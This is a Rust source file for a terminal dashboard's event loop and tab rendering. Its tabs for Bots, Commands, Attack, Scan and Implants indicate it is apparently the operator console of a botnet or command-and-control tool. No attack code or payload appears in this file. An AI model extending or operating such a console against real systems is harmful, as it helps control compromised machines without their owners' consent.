//! Application state and event loop.

use crate::api;
use crate::tabs;
use crate::ui;
use crossterm::event::{self, Event, KeyCode, KeyEventKind};
use ratatui::layout::{Constraint, Direction, Layout};
use ratatui::style::{Color, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Paragraph, Tabs};
use ratatui::Frame;
use std::time::{Duration, Instant};

const TAB_NAMES: &[&str] = &["Bots", "Repos", "Commands", "Attack", "Scan", "Implants", "Config", "Stats"];

pub struct DashboardApp {
    api: api::ApiClient,
    selected_tab: usize,
    running: bool,
    status_line: String,
    last_status: Instant,

    bot_state: tabs::bots::BotTabState,
    repo_state: tabs::repos::RepoTabState,
    cmd_state: tabs::commands::CmdTabState,
    attack_state: tabs::attack::AttackTabState,
    scan_state: tabs::scanner::ScanTabState,
    implant_state: tabs::implants::ImplantTabState,
    config_state: tabs::config::ConfigTabState,
    stats_state: tabs::stats::StatsTabState,
}

impl DashboardApp {
    pub fn new(api: api::ApiClient) -> Self {
        DashboardApp {
            api,
            selected_tab: 0,
            running: true,
            status_line: String::from("Ready. 'q' quit | 'F1-F8' tabs | 'r' refresh | '?' help"),
            last_status: Instant::now(),

            bot_state: tabs::bots::BotTabState::default(),
            repo_state: tabs::repos::RepoTabState::default(),
            cmd_state: tabs::commands::CmdTabState::default(),
            attack_state: tabs::attack::AttackTabState::default(),
            scan_state: tabs::scanner::ScanTabState::default(),
            implant_state: tabs::implants::ImplantTabState::default(),
            config_state: tabs::config::ConfigTabState::default(),
            stats_state: tabs::stats::StatsTabState::default(),
        }
    }

    fn status(&mut self, msg: &str) {
        self.status_line = msg.to_string();
        self.last_status = Instant::now();
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut terminal = ratatui::init();
        
        self.refresh_bots().await;
        self.refresh_repos().await;
        self.refresh_stats().await;

        while self.running {
            terminal.draw(|f| self.render(f))?;

            if event::poll(Duration::from_millis(200))? {
                if let Event::Key(key) = event::read()? {
                    if key.kind == KeyEventKind::Press {
                        self.handle_key(key.code).await;
                    }
                }
            }

            if self.last_status.elapsed() > Duration::from_secs(5) {
                self.status_line.clear();
            }
        }

        ratatui::restore();
        Ok(())
    }

    async fn handle_key(&mut self, key: KeyCode) {
        match key {
            KeyCode::Char('q') | KeyCode::Esc => self.running = false,
            KeyCode::Char('?') => {
                self.status("Keys: F1-F8 tabs | Up/Down nav | Enter select | r refresh | a add | d delete | p push | q quit");
            }
            KeyCode::F(1) | KeyCode::Char('1') => self.selected_tab = 0,
            KeyCode::F(2) | KeyCode::Char('2') => self.selected_tab = 1,
            KeyCode::F(3) | KeyCode::Char('3') => self.selected_tab = 2,
            KeyCode::F(4) | KeyCode::Char('4') => self.selected_tab = 3,
            KeyCode::F(5) | KeyCode::Char('5') => self.selected_tab = 4,
            KeyCode::F(6) | KeyCode::Char('6') => self.selected_tab = 5,
            KeyCode::F(7) | KeyCode::Char('7') => self.selected_tab = 6,
            KeyCode::F(8) | KeyCode::Char('8') => self.selected_tab = 7,
            KeyCode::Right | KeyCode::Tab => {
                self.selected_tab = (self.selected_tab + 1) % TAB_NAMES.len();
            }
            KeyCode::Left | KeyCode::BackTab => {
                self.selected_tab = (self.selected_tab + TAB_NAMES.len() - 1) % TAB_NAMES.len();
            }
            KeyCode::Char('r') => {
                self.status("Refreshing...");
                match self.selected_tab {
                    0 => self.refresh_bots().await,
                    1 => self.refresh_repos().await,
                    2 => { self.refresh_cmds().await; }
                    3 => {}
                    4 => {}
                    5 => {}
                    6 => { self.refresh_config().await; }
                    7 => self.refresh_stats().await,
                    _ => {}
                }
                self.status("Refreshed.");
            }
            _ => {
                let api = &self.api;
                let status_line = &mut self.status_line;
                match self.selected_tab {
                    0 => tabs::bots::handle_key(key, &mut self.bot_state, api, status_line).await,
                    1 => tabs::repos::handle_key(key, &mut self.repo_state, api, status_line).await,
                    2 => tabs::commands::handle_key(key, &mut self.cmd_state, api, status_line).await,
                    3 => tabs::attack::handle_key(key, &mut self.attack_state, api, status_line).await,
                    4 => tabs::scanner::handle_key(key, &mut self.scan_state, api, status_line).await,
                    5 => tabs::implants::handle_key(key, &mut self.implant_state, api, status_line).await,
                    6 => tabs::config::handle_key(key, &mut self.config_state, api, status_line).await,
                    7 => tabs::stats::handle_key(key, &mut self.stats_state, api, status_line).await,
                    _ => {}
                }
            }
        }
    }

    fn render(&mut self, f: &mut Frame) {
        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .constraints([Constraint::Length(3), Constraint::Min(0), Constraint::Length(1)])
            .split(f.area());

        let tab_titles: Vec<Line> = TAB_NAMES.iter().enumerate().map(|(i, name)| {
            if i == self.selected_tab {
                Line::from(Span::styled(format!(" {name} "), Style::default().fg(Color::Black).bg(Color::Cyan)))
            } else {
                Line::from(Span::styled(format!(" {name} "), Style::default().fg(Color::Gray)))
            }
        }).collect();

        f.render_widget(
            Tabs::new(tab_titles)
                .block(Block::default())
                .highlight_style(Style::default().fg(Color::Cyan)),
            chunks[0],
        );

        let tab_area = ui::centered_rect(95, 95, chunks[1]);
        match self.selected_tab {
            0 => tabs::bots::render(f, tab_area, &mut self.bot_state),
            1 => tabs::repos::render(f, tab_area, &mut self.repo_state),
            2 => tabs::commands::render(f, tab_area, &mut self.cmd_state),
            3 => tabs::attack::render(f, tab_area, &mut self.attack_state),
            4 => tabs::scanner::render(f, tab_area, &mut self.scan_state),
            5 => tabs::implants::render(f, tab_area, &mut self.implant_state),
            6 => tabs::config::render(f, tab_area, &mut self.config_state),
            7 => tabs::stats::render(f, tab_area, &mut self.stats_state),
            _ => {}
        }

        let status_style = if self.status_line.contains("Error") || self.status_line.contains("error") {
            Style::default().fg(Color::Red)
        } else {
            Style::default().fg(Color::DarkGray)
        };
        f.render_widget(
            Paragraph::new(Span::styled(&self.status_line, status_style)),
            chunks[2],
        );
    }

    async fn refresh_bots(&mut self) {
        if let Ok(bots) = self.api.list_bots().await { self.bot_state.bots = bots; }
        else { self.status("Error: Failed to load bots"); }
    }

    async fn refresh_repos(&mut self) {
        if let Ok(repos) = self.api.list_repos().await { self.repo_state.repos = repos; }
        else { self.status("Error: Failed to load repos"); }
    }

    async fn refresh_cmds(&mut self) {
        if let Ok(cmds) = self.api.list_commands().await { self.cmd_state.commands = cmds; }
        else { self.status("Error: Failed to load commands"); }
    }

    async fn refresh_config(&mut self) {
        if let Ok(hb) = self.api.get_heartbeat().await { self.config_state.heartbeat = Some(hb); }
        if let Ok(stats) = self.api.get_stats().await { self.config_state.padding_enabled = stats.padding_enabled; }
    }

    async fn refresh_stats(&mut self) {
        if let Ok(stats) = self.api.get_stats().await { self.stats_state.stats = Some(stats); }
        else { self.status("Error: Failed to load stats"); }
    }
}
